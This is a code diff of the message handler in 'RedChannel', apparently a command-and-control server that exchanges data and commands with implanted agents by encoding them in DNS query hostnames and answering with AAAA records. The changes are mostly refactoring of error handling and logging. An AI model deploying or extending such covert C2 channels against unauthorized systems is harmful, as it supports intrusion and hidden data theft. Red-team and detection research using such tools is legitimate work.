@@ -14,10 +14,10 @@ const crypto = new Crypto();
 
 const RedChannel = require("./lib/redchannel.js");
 const rc = new RedChannel(c2_message_handler);
-rc.app_root = __dirname;
 
 const RedChannelUI = require("./lib/ui.js");
 const ui = new RedChannelUI(rc, crypto);
+rc.ui = ui;
 
 const cli = require("commander");
 cli.version(RC_VERSION, "-v, --version")
@@ -191,7 +191,7 @@ function c2_message_handler(req, res) {
     }
 
     if (!hostname.endsWith(rc.config.c2.domain)) {
-        //ui.debug("unknown c2 domain, ignoring query for: " + hostname);
+        ui.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
         res.end();
         return;
     }
@@ -206,6 +206,7 @@ function c2_message_handler(req, res) {
     var segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
     if (segments.length < EXPECTED_DATA_SEGMENTS) {
         ui.error(util.format("c2: invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));
+
         res.end();
         return;
     }
@@ -231,6 +232,7 @@ function c2_message_handler(req, res) {
         command = parseInt(segments[2].slice(0, 2), 16);
     } catch (ex) {
         ui.error(`c2: failed to parse command: ${ex.toString()}`);
+
         res.end();
         return;
     }
@@ -247,6 +249,7 @@ function c2_message_handler(req, res) {
                 data: status,
                 ttl: ttl,
             });
+
             res.end();
             return;
         }
@@ -260,6 +263,7 @@ function c2_message_handler(req, res) {
             }, FLOOD_PROTECTION_TIMEOUT);
 
             ui.warn(`c2: ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);
+
             res.end();
             return;
         }
@@ -290,21 +294,14 @@ function c2_message_handler(req, res) {
         current_chunk = parseInt(segments[2].slice(2, 4), 16);
         total_chunks = parseInt(segments[2].slice(4, 6), 16);
     } catch (ex) {
-        ui.error(`c2: invalid chunk numbers, current: ${current_chunk}, total: ${total_chunks}`);
-        return;
+        return ui.error(`c2: invalid chunk numbers, current: ${current_chunk}, total: ${total_chunks}`);
     }
 
     var data_id = segments[3];
-    if (data_id.length < 2) {
-        ui.error(`c2: invalid data id: ${data_id}`);
-        return;
-    }
+    if (data_id.length < 2) return ui.error(`c2: invalid data id: ${data_id}`);
 
     var chunk = segments[4];
-    if (chunk.length < 2) {
-        ui.error(`c2: invalid chunk: ${chunk}`);
-        return;
-    }
+    if (chunk.length < 2) return ui.error(`c2: invalid chunk: ${chunk}`);
 
     if (typeof rc.agents[agent_id].recvq[command] == "undefined") {
         rc.agents[agent_id].recvq[command] = {};
@@ -331,16 +328,19 @@ function c2_message_handler(req, res) {
                 ttl: ttl,
             });
         }
-    } else {
-        // last byte 01 indicates more data is expected
-        status = rc.make_ip_string("01");
-        res.answer.push({
-            name: hostname,
-            type: "AAAA",
-            data: status,
-            ttl: ttl,
-        });
+
+        res.end();
+        return;
     }
+
+    // last byte 01 indicates more data is expected
+    status = rc.make_ip_string("01");
+    res.answer.push({
+        name: hostname,
+        type: "AAAA",
+        data: status,
+        ttl: ttl,
+    });
 
     /*if (question.type == 'CNAME') {
         res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
@@ -349,6 +349,7 @@ function c2_message_handler(req, res) {
         res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
     }*/
     res.end();
+    return;
 }
 
 /**
